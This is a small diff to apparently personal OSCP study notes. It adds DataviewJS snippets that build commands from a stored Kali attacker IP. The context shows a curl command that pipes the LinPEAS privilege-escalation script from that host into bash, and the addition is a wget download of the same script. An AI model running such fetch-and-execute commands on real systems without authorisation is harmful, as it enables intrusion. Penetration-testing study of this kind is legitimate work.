@@ -20,6 +20,14 @@ const command = `curl http://${KaliIP}:8888/linpeas.sh | bash`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+or
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `wget http://${KaliIP}:8888/linpeas.sh`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 
 WinPEAS
 
